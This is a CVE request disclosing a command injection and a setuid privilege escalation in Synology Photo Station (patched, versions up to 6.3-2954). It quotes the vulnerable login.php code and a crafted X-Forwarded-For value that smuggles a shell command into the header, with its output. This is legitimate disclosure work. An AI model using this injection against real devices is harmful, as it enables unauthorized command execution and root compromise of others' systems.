Subject: CVE request: Synology Photo Station command injection and privilege
 escalation

Title: Synology Photo Station command injection and privilege escalation
Vendor: Synology (https://www.synology.com/)
Product: Photo Station
Status: Patch released
Affected: version <= 6.3-2954
Impact: Any guest account can execute arbitrary command with root permission



Vulnerability 1: Command injection

The vulnerability is in appstore/PhotoStation/photo/login.php

118     if ($x_forward) {
119         $ip = $x_forward;
120     }
...
176     $commend = "/usr/syno/bin/synoautoblock --reset \"".$ip."\"";
177     @system($commend, $retval);

Since, the page did not filter X-Forwarded-For header and lead to command injection
After sending a crafted header, a command is executed under http permission

X-Forwarded-For: ";id>/tmp/hack;"

> cat /tmp/hack
uid=1023(http) gid=1023(http) groups=1023(http)



Vulnerability 2: Privilege escalation

For the privilege escalation vulnerability, it is a simple setuid problem.

> ls -al /usr/syno/bin/synophoto_dsm_user
lrwxrwxrwx    1 root     root            56 Sep 16 22:53 /usr/syno/bin/synophoto_dsm_user -> /var/packages/PhotoStation/target/bin/synophoto_dsm_user
> ls -al /var/packages/PhotoStation/target/bin/synophoto_dsm_user
-rwsr-xr-x    1 root     root         30520 Jul  6 19:55 /var/packages/PhotoStation/target/bin/synophoto_dsm_user
